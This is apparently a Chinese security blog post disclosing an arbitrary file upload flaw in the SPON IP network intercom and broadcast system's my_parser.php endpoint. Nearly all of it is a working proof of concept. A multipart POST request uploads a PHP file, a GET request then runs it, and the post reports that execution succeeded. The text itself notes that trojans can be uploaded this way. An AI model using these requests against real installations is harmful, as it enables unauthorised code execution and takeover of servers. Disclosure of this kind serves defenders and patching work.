#  世邦通信SPON IP网络对讲广播系统my_parser.php 接口处存在文件上传漏洞   
原创 R0seK1ller  蟹堡安全团队   2024-08-06 23:59  
  
# 1. 漏洞描述  
  
    世邦通信 SPON IP网络对讲广播系统 my_parser.php 存在任意文件上传漏洞，攻击者可以通过漏洞上传任意文件甚至木马文件，从而获取服务器权限。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWkicQxOPON5a5MyqeLDa2OKxTgCiaZEJiaWHMfNJhpLoe2u9P5j9E9OibjmMATibfCyq3ZIqVu4BDBBIA/640?wx_fmt=png&from=appmsg "")  
## 2. 漏洞复现  
```
POST /upload/my_parser.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36
Content-Length: 277
Content-Type: multipart/form-data; boundary=0300a03a9419748c18d96a7e6e03d7be6f7f3f1ef6df950f196738fe8230
Accept-Encoding: gzip, deflate, br
Connection: close

--0300a03a9419748c18d96a7e6e03d7be6f7f3f1ef6df950f196738fe8230
Content-Disposition: form-data; name="upload"; filename="test.php"
Content-Type: application/octet-stream

<?php echo md5(1);unlink(__FILE__);?>
--0300a03a9419748c18d96a7e6e03d7be6f7f3f1ef6df950f196738fe8230--

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWkicQxOPON5a5MyqeLDa2OKGKZtJNr4peKGzZ3qjgmaVspl3c5GYFeCON1ODKWAs1tbibSokZ1Fjag/640?wx_fmt=png&from=appmsg "")  
```
```  
```
GET /upload/files/test.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36
Accept-Encoding: gzip, deflate, br
Connection: close


```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWkicQxOPON5a5MyqeLDa2OKcXN2mSp5I7CYdFby8MJp36vBmHQMNEu8csicEVDkEiaEM3P9siajfIobw/640?wx_fmt=png&from=appmsg "")  
  
成功执行md5(1)，并输出返回信息。  
  
  
